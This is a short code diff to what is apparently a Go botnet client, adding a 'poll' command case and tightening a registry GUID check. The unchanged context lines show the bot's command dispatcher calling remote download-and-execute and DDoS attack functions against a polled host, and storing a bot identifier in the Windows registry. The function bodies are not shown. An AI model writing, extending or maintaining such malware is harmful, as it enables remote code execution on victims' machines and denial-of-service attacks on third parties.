@@ -69,6 +69,8 @@ func send_poll_request(host string) BotState {
 		do_remote_download_execute(reply, host)
 	case "ddos":
 		do_ddos_attack(reply, host)
+	case "poll":
+		log.Printf("poll again")
 	case "test":
 		log.Printf("test report")
 	}
@@ -83,7 +85,7 @@ func auth_bot_poll(state BotState, host string) BotState {
 	switch state {
 	case StateReadGuid:
 		val := reg_read_key(registry.CURRENT_USER, g_regpath, "guid", false)
-		if val == nil {
+		if val == nil || val == "" {
 			next_state = StateGenGuid
 		} else {
 			g_guid = val.(string)
